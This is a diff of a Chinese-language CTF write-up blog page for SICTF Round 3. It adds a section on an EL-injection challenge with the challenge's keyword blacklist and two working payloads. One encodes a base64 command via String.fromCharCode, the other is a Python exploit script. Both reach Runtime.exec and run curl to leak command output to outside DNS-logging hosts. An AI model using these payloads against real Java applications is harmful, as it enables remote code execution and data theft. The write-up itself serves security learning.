@@ -29,6 +29,8 @@
 <meta property="og:image" content="https://zer0peach.github.io/images/SICTF-Round3/image-20240219113614991.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/SICTF-Round3/image-20240219174609003.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/SICTF-Round3/image-20240219175337653.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/SICTF-Round3/image-20240220224751404.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/SICTF-Round3/image-20240220225314409.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/SICTF-Round3/image-20240219180610100.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/SICTF-Round3/image-20240219180831954.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/SICTF-Round3/image-20240219181336365.png">
@@ -47,7 +49,7 @@
 <meta property="og:image" content="https://zer0peach.github.io/images/SICTF-Round3/image-20240219184457111.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/SICTF-Round3/image-20240219184506559.png">
 <meta property="article:published_time" content="2024-02-19T03:10:21.000Z">
-<meta property="article:modified_time" content="2024-02-19T10:54:59.520Z">
+<meta property="article:modified_time" content="2024-02-20T15:04:07.110Z">
 <meta property="article:author" content="Zer0peach">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://zer0peach.github.io/images/SICTF-Round3/image-20240219111312426.png">
@@ -255,7 +257,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          14k 字
+          17k 字
         
       </span>
     
@@ -266,7 +268,7 @@
         
         
         
-          117 分钟
+          140 分钟
         
       </span>
     
@@ -510,6 +512,77 @@ r = requests<span class="hljs-selector-class">.post</span>(url,data)<span class=
 <span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(r)</span></span></code></pre></div>
 
 <p><img src="/../images/SICTF-Round3/image-20240219175337653.png" srcset="/img/loading.gif" lazyload alt="image-20240219175337653"></p>
+<h2 id="进阶-elInjection"><a href="#进阶-elInjection" class="headerlink" title="[进阶]elInjection *"></a>[进阶]elInjection *</h2><p>EL表达式，提示很多，目标很明确，但就是没写出来（很烦</p>
+<p>赛后看了下别人的WP，回来再修改一下原来的做法，发现又被Runtime的exec给坑了</p>
+<p>以后见到exec，里面就用base64</p>
+<p><img src="/../images/SICTF-Round3/image-20240220224751404.png" srcset="/img/loading.gif" lazyload alt="image-20240220224751404"></p>
+<p>黑名单</p>
+<div class="code-wrapper"><pre><code class="hljs routeros">list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;Runtime&quot;</span>);
+list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;exec&quot;</span>);
+list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;invoke&quot;</span>);
+list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;exec&quot;</span>);
+list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;Process&quot;</span>);
+list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;ClassLoader&quot;</span>);
+list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;load&quot;</span>);
+list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;Response&quot;</span>);
+list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;Request&quot;</span>);
+list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;Base64Utils&quot;</span>);
+list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;ReflectUtils&quot;</span>);
+list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;getWriter&quot;</span>);
+list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;Thread&quot;</span>);
+list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;defineClass&quot;</span>);
+list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;bcel&quot;</span>);
+list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;RequestAttributes&quot;</span>);
+list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;File&quot;</span>);
+list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;flag&quot;</span>);
+list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;URL&quot;</span>);
+list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;Command&quot;</span>);
+list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;Inet&quot;</span>);
+list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;System&quot;</span>);
+list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;\\u&quot;</span>);
+list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;\\x&quot;</span>);
+list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;&#x27;&quot;</span>);</code></pre></div>
+
+<h3 id="我的做法"><a href="#我的做法" class="headerlink" title="我的做法"></a>我的做法</h3><p>利用ScriptEngineManager获取js，利用js的String.fromCharCode进行绕过</p>
+<div class="code-wrapper"><pre><code class="hljs autohotkey">curl `whoami`.vabueyf6.requestrepo.com</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs stylus">java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Runtime</span><span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&quot;bash -c &#123;echo,Y3VybCBgd2hvYW1pYC52YWJ1ZXlmNi5yZXF1ZXN0cmVwby5jb20=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>)</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs dns">$&#123;&quot;&quot;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;js&quot;).eval(&quot;eval(String.fromCharCode(<span class="hljs-number">106,97,118,97</span>,<span class="hljs-number">46,108,97,110</span>,<span class="hljs-number">103,46,82,117</span>,<span class="hljs-number">110,116,105,109</span>,<span class="hljs-number">101,46,103,101</span>,<span class="hljs-number">116,82,117,110</span>,<span class="hljs-number">116,105,109,101</span>,<span class="hljs-number">40,41,46,101</span>,<span class="hljs-number">120,101,99,40</span>,<span class="hljs-number">34,98,97,115</span>,<span class="hljs-number">104,32,45,99</span>,<span class="hljs-number">32,123,101,99</span>,<span class="hljs-number">104,111,44,89</span>,<span class="hljs-number">51,86,121,98</span>,<span class="hljs-number">67,66,103,100</span>,<span class="hljs-number">50,104,118,89</span>,<span class="hljs-number">87,49,112,89</span>,<span class="hljs-number">67,53,50,89</span>,<span class="hljs-number">87,74,49,90</span>,<span class="hljs-number">88,108,109,78</span>,<span class="hljs-number">105,53,121,90</span>,<span class="hljs-number">88,70,49,90</span>,<span class="hljs-number">88,78,48,99</span>,<span class="hljs-number">109,86,119,98</span>,<span class="hljs-number">121,53,106,98</span>,<span class="hljs-number">50,48,61,125</span>,<span class="hljs-number">124,123,98,97</span>,<span class="hljs-number">115,101,54,52</span>,<span class="hljs-number">44,45,100,125</span>,<span class="hljs-number">124,123,98,97</span>,<span class="hljs-number">115,104,44,45</span>,<span class="hljs-number">105,125,34,41</span>,<span class="hljs-number">59</span>))&quot;)&#125;</code></pre></div>
+
+<p><img src="/../images/SICTF-Round3/image-20240220225314409.png" srcset="/img/loading.gif" lazyload alt="image-20240220225314409"></p>
+<p>当然当时没有一个很好的接受dns的网站，导致我一直不确定是我的错了还是网站不行</p>
+<p>现在看别人用的收集了一个（嘻嘻</p>
+<h3 id="晨曦WP-1"><a href="#晨曦WP-1" class="headerlink" title="晨曦WP"></a>晨曦WP</h3><p>通过java的 charAt 与 toChars 获取字符，在由 toString 转字符串再用 concat 拼接来绕过一些敏感字符的过滤。</p>
+<div class="code-wrapper"><pre><code class="hljs maxima">import requests
+import <span class="hljs-built_in">base64</span>
+
+def encode(payload):
+	encode_payload = <span class="hljs-string">&quot;&quot;</span>
+	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, len(payload)):
+		<span class="hljs-keyword">if</span> i == <span class="hljs-number">0</span>:
+			encode_payload += <span class="hljs-string">&quot;true.toString().charAt(0).toChars(%d)[0].toString()&quot;</span> <span class="hljs-symbol">%</span> ord(payload[<span class="hljs-number">0</span>])
+		<span class="hljs-keyword">else</span>:
+			encode_payload += <span class="hljs-string">&quot;.concat(true.toString().charAt(0).toChars(%d)[0].toString())&quot;</span> <span class="hljs-symbol">%</span> ord(payload[i])
+	<span class="hljs-built_in">return</span> encode_payload
+
+# 这里填命令
+cmd = b<span class="hljs-string">&quot;curl `/readflag`.kbqsag.ceye.io&quot;</span>
+
+#<span class="hljs-built_in">print</span>(<span class="hljs-built_in">base64</span>.b64encode(cmd))
+
+<span class="hljs-built_in">exp</span> = &#x27;$&#123;<span class="hljs-string">&quot;&quot;</span>.getClass().forName(<span class="hljs-string">&quot;javax.script.ScriptEngineManager&quot;</span>).newInstance().getEngineByName(<span class="hljs-string">&quot;JavaScript&quot;</span>).<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">%s</span>)&#125;&#x27; <span class="hljs-symbol">%</span> (encode(<span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,&quot;</span>+<span class="hljs-built_in">base64</span>.b64encode(cmd).decode()+<span class="hljs-string">&quot;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;)&quot;</span>))
+#<span class="hljs-built_in">print</span>(<span class="hljs-built_in">exp</span>)
+
+url = <span class="hljs-string">&quot;http://yuanshen.life:23333/test&quot;</span>
+
+data = &#123;&#x27;<span class="hljs-built_in">exp</span>&#x27;: <span class="hljs-built_in">exp</span>&#125;
+r = requests.post(url, data).text
+
+<span class="hljs-built_in">print</span>(r)</code></pre></div>
+
+<p>太麻烦了，没我的方便</p>
+<h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>预期是不出网的，等WP出了再补充</p>
 <h2 id="【进阶】CC-deserialize"><a href="#【进阶】CC-deserialize" class="headerlink" title="【进阶】CC_deserialize *"></a>【进阶】CC_deserialize *</h2><p>遗憾啊，0解题痛失一血，</p>
 <p>截取的聊天段落</p>
 <p><img src="/../images/SICTF-Round3/image-20240219180610100.png" srcset="/img/loading.gif" lazyload alt="image-20240219180610100"></p>
@@ -529,7 +602,7 @@ r = requests<span class="hljs-selector-class">.post</span>(url,data)<span class=
 <p>那这里就要考虑执行完transform方法后如何返回我们的恶意<code>RMIConnector</code>对象</p>
 <p>这里熟悉所有CC链的师傅就会想到<code>ConstantTransformer</code></p>
 <p><img src="/../images/SICTF-Round3/image-20240219182430047.png" srcset="/img/loading.gif" lazyload alt="image-20240219182430047"></p>
-<p>它的transform方法就是返回传入他的参数</p>
+<p>它的transform方法就是返回构造函数时传入他的参数</p>
 <p>花了半个小时才想到</p>
 <h3 id="关键点二"><a href="#关键点二" class="headerlink" title="关键点二"></a>关键点二</h3><p>我们正常的该链子可以看到这里的entry是<code>HashMap$Node</code>，之后就结束了</p>
 <p><img src="/../images/SICTF-Round3/image-20240219182822810.png" srcset="/img/loading.gif" lazyload alt="image-20240219182822810"></p>
